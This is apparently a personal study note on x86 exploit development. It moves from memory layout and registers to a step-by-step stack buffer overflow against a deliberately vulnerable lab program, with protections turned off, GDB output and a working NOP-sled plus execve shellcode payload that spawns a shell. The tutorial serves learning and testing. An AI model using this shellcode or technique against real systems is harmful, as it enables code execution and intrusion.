# Learning
https://github.com/FabioBaroni/awesome-exploit-development

# Three type of memory segment: .text, .bss, .data
	- .text > read only, holds program instruction
	- .bss > writable, reserve for uninitialize global variable 
	- .data > writable, reserve for initialize global variable

## Memory module example
----------------------------------------------------------
	↑ Lower addresses (0x08000000)
	Shared libraries
	.text
	.bss
	Heap (grows ↓)
	Stack (grows ↑)
	env pointer
	Argc
	↓ Higher addresses (0xbfffffff)
----------------------------------------------------------

# Registers
	- General perpose register (EAX, EBX, and ECX) store data and address, offset address, perform counting, and many other things
		- ESP is a general perpose: stack pointer point to memery address where the next operation will take place.
	- Segment register (CS, DS, SS) unlike other registers segment register are 16 bit are used to keep track of segments and to allow backward compatibility with 16-bit applications.
	- Control register (EIP) are used to control the function of the processor. EIP contains the address of the next machine instruction to be executed
	- Other register (EFLAGS) comprises many sin/gle-bit registers that are used to store the results of various tests performed by the processor

## Sample C family code to assemble
----------------------------------------------------------
C++>
int number;
. . . more code . . .
number++;

ASM>
number dw 0
. . .more code . . .
mov eax,number
inc eax
mov number,eax

We use the Define Word (DW) instruction to define a value for our integer,
number. Next we put the value into the EAX register, increment the value in the
EAX register by one, and then move this value back into the number integer
----------------------------------------------------------

----------------------------------------------------------
Look at a simple if statement in C++>

int number;
if (number<0) {
	. . .more code . . .
}

ASM> 
number dw 0
mov eax,number
or eax,eax
jge label
<no>
label :<yes>

What we are doing here is defining a value for number again with the DW
instruction. Then we move the value stored in number into EAX, then we jump
to label if number is greater than or equal to zero with Jump if Greater than or
Equal to (JGE).
----------------------------------------------------------

----------------------------------------------------------
Here’s another example, using an array>

int array[4];
. . .more code . . .
array[2]=9;

ASM>
array dw 0,0,0,0
. . .more code . . .
mov ebx,2
mov array[ebx],9

we declare an array, then use the EBX register to move values
into the array.
----------------------------------------------------------

----------------------------------------------------------
Complicated> 

int triangle (int width, in height){
int array[5] = {0,1,2,3,4};
int area;
area = width * height/2;
return (area);
}

ASM>
		0x8048430 <triangle>: push %ebp
		0x8048431 <triangle+1>: mov %esp, %ebp
		0x8048433 <triangle+3>: push %edi
		0x8048434 <triangle+4>: push %esi
		0x8048435 <triangle+5>: sub $0x30,%esp
		0x8048438 <triangle+8>: lea 0xffffffd8(%ebp), %edi
		0x804843b <triangle+11>: mov $0x8049508,%esi
		0x8048440 <triangle+16>: cld
		0x8048441 <triangle+17>: mov $0x30,%esp
		0x8048446 <triangle+22>: repz movsl %ds:( %esi), %es:( %edi)
		0x8048448 <triangle+24>: mov 0x8(%ebp),%eax
		0x804844b <triangle+27>: mov %eax,%edx
		0x804844d <triangle+29>: imul 0xc(%ebp),%edx
		0x8048451 <triangle+33>: mov %edx,%eax
		0x8048453 <triangle+35>: sar $0x1f,%eax
		0x8048456 <triangle+38>: shr $0x1f,%eax
		0x8048459 <triangle+41>: lea (%eax, %edx, 1), %eax
		0x804845c <triangle+44>: sar %eax
		0x804845e <triangle+46>: mov %eax,0xffffffd4(%ebp)
		0x8048461 <triangle+49>: mov 0xffffffd4(%ebp),%eax
		0x8048464 <triangle+52>: mov %eax,%eax
		0x8048466 <triangle+54>: add $0x30,%esp
		0x8048469 <triangle+57>: pop %esi
		0x804846a <triangle+58>: pop %edi
		0x804846b <triangle+59> pop %ebp
		0x804846c <triangle+60>: ret

note the first few instructions—saving EBP, and
subtracting from ESP. The subtraction makes room on the stack for the function’s local variables. It’s also worth noting that the function returns its result in the EAX register.

## Function and the stack
```c
void function(int a, int b)
{
	int array[5];
}
main()
{
	function(1,2);

	print("This is where the return address points");
}
```
In this example, instructions in main are executed until a function call is encountered. The consecutive execution of the program now needs to be interrupted, and the instructions in function need to be executed. 
1) The first step is to push the arguments for function, a and b, backward onto the stack.
2) Placing return address, or RET, onto the stack. (RET is the address store in the EIP)
3) PUSH EBP # save old EBP
4) mov %esp, %ebp # set current EBP to be current stack pointer (EBP will act as frame pointer)
5) SUB $0x14, %esp # reserve stack for local variable
```
--------------------------
| Local variable (BUF)   | Low memory address
--------------------------
|           EBP          |
--------------------------
|           RET          |   Stack (grows ↑)
--------------------------   
|            A           |
--------------------------
|            B           |  High memory address
--------------------------
```

## Start exploiting - Stack Buffer Overflow
Let's start, we have to modify Linux kernel to disable ASLR to prevent the kernel to change memory address of our program when we execute it.
```
root@BOEING:# echo 0 > /proc/sys/kernel/randomize_va_space 
root@BOEING:# cat /proc/sys/kernel/randomize_va_space 
0
```

Now it's time to compile the code but by default of GCC 3.x and 4.x the compiler will compile codes by adding "Stack-smashing protection" to prevent people to exploit any program easily. So we have to compile our code with additional options.
```c
#include <stdio.h>

int main (int argc, char *argv[]) {
	char buf[256];
	memcpy(buf, argv[1], strlen(argv[1]));
	printf(buf);
}
```

```
root@BOEING:# gcc -ggdb -o stack_overflow_basic -z execstack -fno-stack-protector -mpreferred-stack-boundary=2 stack_overflow_basic.c
stack_overflow_basic.c: In function ‘main’:
stack_overflow_basic.c:5:2: warning: implicit declaration of function ‘memcpy’ [-Wimplicit-function-declaration]
  memcpy(buf, argv[1], strlen(argv[1]));
  ^~~~~~
stack_overflow_basic.c:5:2: warning: incompatible implicit declaration of built-in function ‘memcpy’
stack_overflow_basic.c:5:2: note: include ‘<string.h>’ or provide a declaration of ‘memcpy’
stack_overflow_basic.c:5:23: warning: implicit declaration of function ‘strlen’ [-Wimplicit-function-declaration]
  memcpy(buf, argv[1], strlen(argv[1]));
                       ^~~~~~
stack_overflow_basic.c:5:23: warning: incompatible implicit declaration of built-in function ‘strlen’
stack_overflow_basic.c:5:23: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
root@BOEING:# chmod +x stack_overflow_basic
root@BOEING:# ./stack_overflow_basic x
xXot@BOEING:# ./stack_overflow_basic AAA
AAAt@BOEING:# 
```

Let's look at program assembly.
```
root@BOEING:# gdb ./stack_overflow_basic
gdb-peda$ disassemble main 
Dump of assembler code for function main:
   0x00000600 <+0>:     push   ebp
   0x00000601 <+1>:     mov    ebp,esp
   0x00000603 <+3>:     push   ebx
   0x00000604 <+4>:     sub    esp,0x100
   0x0000060a <+10>:    call   0x4d0 <__x86.get_pc_thunk.bx>
   0x0000060f <+15>:    add    ebx,0x19f1
   0x00000615 <+21>:    mov    eax,DWORD PTR [ebp+0xc]
   0x00000618 <+24>:    add    eax,0x4
   0x0000061b <+27>:    mov    eax,DWORD PTR [eax]
   0x0000061d <+29>:    push   eax
   0x0000061e <+30>:    call   0x460 <strlen@plt>
   0x00000623 <+35>:    add    esp,0x4
   0x00000626 <+38>:    mov    edx,eax
   0x00000628 <+40>:    mov    eax,DWORD PTR [ebp+0xc]
   0x0000062b <+43>:    add    eax,0x4
   0x0000062e <+46>:    mov    eax,DWORD PTR [eax]
   0x00000630 <+48>:    push   edx
   0x00000631 <+49>:    push   eax
   0x00000632 <+50>:    lea    eax,[ebp-0x104]
   0x00000638 <+56>:    push   eax
   0x00000639 <+57>:    call   0x450 <memcpy@plt>
   0x0000063e <+62>:    add    esp,0xc
   0x00000641 <+65>:    lea    eax,[ebp-0x104]
   0x00000647 <+71>:    push   eax
   0x00000648 <+72>:    call   0x440 <printf@plt>
   0x0000064d <+77>:    add    esp,0x4
   0x00000650 <+80>:    mov    eax,0x0
   0x00000655 <+85>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x00000658 <+88>:    leave  
   0x00000659 <+89>:    ret    
End of assembler dump.
```

The main function just allocate memory for 0x100 (256 Bytes). At <+57> the function copy program argument without checking it's length to buffer and from here the overflow has been occured. 

Let's run the program.
```
root@BOEING:# ./stack_overflow_basic $(python -c 'print("A"*265)')
Segmentation fault
root@BOEING:# ./stack_overflow_basic $(python -c 'print("A"*264)')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

We actually declare an array of 256 bytes but when we try to input 265 "A" the program has error "Segmentation fault"

Segmentation fault is a specific kind of error caused by accessing memory that “does not belong to our program. 

Let's check it out in GDB and see what happens.

```
gdb-peda$ r $(python -c 'print("A"*265)')
Starting program: /kapi/exploitdev/stack_overflow_basic $(python -c 'print("A"*265)')

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41414141 ('AAAA')
ECX: 0x80003115 --> 0x0 
EDX: 0xb7fb2870 --> 0x0 
ESI: 0xb7fb1000 --> 0x1aedb0 
EDI: 0xb7fb1000 --> 0x1aedb0 
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff5b0 --> 0x2 
EIP: 0xb7e1a541 (<__libc_start_main+65>:        adc    BYTE PTR [ebx+0x6a04ec],al)
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
```

Segmentation fault tell us the program try to access memory address that the program has no authorization. You may notice that the EIP register has been manipulated by our input "A" which represent 0x41 in hex. If you input more 3 "A" it could overide all EIP.

```
gdb-peda$ r $(python -c 'print("A"*264 + "B"*4)')
Starting program: /kapi/exploitdev/stack_overflow_basic $(python -c 'print("A"*264 + "B"*4)')

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x41414141 ('AAAA')
ECX: 0x80003115 --> 0x0 
EDX: 0xb7fb2870 --> 0x0 
ESI: 0xb7fb1000 --> 0x1aedb0 
EDI: 0xb7fb1000 --> 0x1aedb0 
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff5b0 --> 0x2 
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbffff5b0 --> 0x2 
0004| 0xbffff5b4 --> 0xbffff644 --> 0xbffff769 ("/kapi/exploitdev/stack_overflow_basic")
0008| 0xbffff5b8 --> 0xbffff650 --> 0xbffff89c ("XDG_SESSION_ID=470")
0012| 0xbffff5bc --> 0x0 
0016| 0xbffff5c0 --> 0x0 
0020| 0xbffff5c4 --> 0x0 
0024| 0xbffff5c8 --> 0xb7fb1000 --> 0x1aedb0 
0028| 0xbffff5cc --> 0xb7fffc04 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 
```

As we expected, the EIP has been overrided by 4 bytes of "B" that I've extended from 264 bytes of "A". Let's check how the stack look like.
```
gdb-peda$ break *main+62
Breakpoint 1 at 0x63e: file stack_overflow_basic.c, line 5.
gdb-peda$ r $(python -c 'print("A"*264 + "B"*4)')
Starting program: /kapi/exploitdev/stack_overflow_basic $(python -c 'print("A"*264 + "B"*4)')
[----------------------------------registers-----------------------------------]
EAX: 0xbffff4a4 ('A' <repeats 200 times>...)
EBX: 0x80002000 --> 0x1ef8 
ECX: 0xbffff500 ('A' <repeats 172 times>, "BBBB\002")
EDX: 0xbffff4a4 ('A' <repeats 200 times>...)
ESI: 0xb7fb1000 --> 0x1aedb0 
EDI: 0xb7fb1000 --> 0x1aedb0 
EBP: 0xbffff5a8 ("AAAABBBB\002")
ESP: 0xbffff498 --> 0xbffff4a4 ('A' <repeats 200 times>...)
EIP: 0x8000063e (<main+62>:     add    esp,0xc)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80000632 <main+50>:        lea    eax,[ebp-0x104]
   0x80000638 <main+56>:        push   eax
   0x80000639 <main+57>:        call   0x80000450 <memcpy@plt>
=> 0x8000063e <main+62>:        add    esp,0xc
   0x80000641 <main+65>:        lea    eax,[ebp-0x104]
   0x80000647 <main+71>:        push   eax
   0x80000648 <main+72>:        call   0x80000440 <printf@plt>
   0x8000064d <main+77>:        add    esp,0x4
[------------------------------------stack-------------------------------------]
0000| 0xbffff498 --> 0xbffff4a4 ('A' <repeats 200 times>...)
0004| 0xbffff49c --> 0xbffff78f ('A' <repeats 200 times>...)
0008| 0xbffff4a0 --> 0x10c 
0012| 0xbffff4a4 ('A' <repeats 200 times>...)
0016| 0xbffff4a8 ('A' <repeats 200 times>...)
0020| 0xbffff4ac ('A' <repeats 200 times>...)
0024| 0xbffff4b0 ('A' <repeats 200 times>...)
0028| 0xbffff4b4 ('A' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x8000063e in main (argc=0x2, argv=0xbffff644) at stack_overflow_basic.c:5
5               memcpy(buf, argv[1], strlen(argv[1]));
gdb-peda$ x /100xw $esp
0xbffff498:     0xbffff4a4      0xbffff78f      0x0000010c      0x41414141
0xbffff4a8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff4b8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff4c8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff4d8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff4e8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff4f8:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff508:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff518:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff528:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff538:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff548:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff558:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff568:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff578:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff588:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff598:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff5a8:     0x41414141      0x42424242      0x00000002      0xbffff644
0xbffff5b8:     0xbffff650      0x00000000      0x00000000      0x00000000
0xbffff5c8:     0xb7fb1000      0xb7fffc04      0xb7fff000      0x00000000
0xbffff5d8:     0xb7fb1000      0xb7fb1000      0x00000000      0x15f44c28
0xbffff5e8:     0x29544238      0x00000000      0x00000000      0x00000000
0xbffff5f8:     0x00000002      0x80000490      0x00000000      0xb7feff10
0xbffff608:     0xb7fea7a0      0x80002000      0x00000002      0x80000490
0xbffff618:     0x00000000      0x800004c1      0x80000600      0x00000002
gdb-peda$ 
```

Now EBP point to 0xbffff5a8 which is 0x41414141 and the next 4 bytes is 0x42424242. Now we successful overide RET pointer to 0x42424242. At this point the stack may look like the following.
```
-BEFORE OVERFLOW-
--------------------------
| Local variable (BUF)   | Low memory address
--------------------------
| Local variable (BUF)   |
--------------------------
| Local variable (BUF)   |
--------------------------
| Local variable (BUF)   |
--------------------------
| Local variable (BUF)   |
--------------------------
|           EBP          |
--------------------------
|           RET          |   Stack (grows ↑)
--------------------------   
|            A           |
--------------------------
|            B           |  High memory address
--------------------------


-AFTER OVERFLOW-
--------------------------
|AAAAAAAAAAAAAAAAAAAAAAAA| Low memory address
--------------------------
|AAAAAAAAAAAAAAAAAAAAAAAA|
--------------------------
|AAAAAAAAAAAAAAAAAAAAAAAA|
--------------------------
|AAAAAAAAAAAAAAAAAAAAAAAA|
--------------------------
|AAAAAAAAAAAAAAAAAAAAAAAA|
--------------------------
|          AAAA          |
--------------------------
|          BBBB          |   Stack (grows ↑)
--------------------------   
|            A           |
--------------------------
|            B           |  High memory address
--------------------------
```

If we change multiple "A" to our shellcode and change "B" to point to our shellcode the program will follow RET pointer to our shellcode and execute them.

```
-PLAN-
--------------------------
|        OUR SHELL       | Low memory address
--------------------------
|        OUR SHELL       |
--------------------------
|        OUR SHELL       |
--------------------------
|        OUR SHELL       | Stack (grows ↑)
--------------------------
|        OUR SHELL       |
--------------------------
|        OUR SHELL       |
--------------------------
|          BBBB          |  BBBB should be an offset that point to our shellcode 
--------------------------   
|            A           |
--------------------------
|            B           |  High memory address
--------------------------
```

The size of buffer that we can put our shell into it is 264 bytes and follow by offset 4 bytes. I choose an offset 0xbffff4e8 that RET address should point to our shellcode.

The following is Shellcode /bin/dash - 49 bytes
```
\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42
```

We have 49 bytes shellcode so we construct our exploit.
{NOP*215} + {shellcode 49 bytes} + {offset}

The complete exploit:
```
gdb-peda$ r $(python -c 'print("\x90"*215 + "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42" + "\xe8\xf4\xff\xbf")')
Starting program: /kapi/exploitdev/stack_overflow_basic $(python -c 'print("\x90"*215 + "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4a\x41\x41\x41\x41\x42\x42\x42\x42" + "\xe8\xf4\xff\xbf")')
process 28080 is executing new program: /bin/dash
# uname -a
[New process 28086]
process 28086 is executing new program: /bin/uname
Linux BOEING 4.6.0-kali1-686-pae #1 SMP Debian 4.6.4-1kali1 (2016-07-21) i686 GNU/Linux
[Inferior 2 (process 28086) exited normally]
```
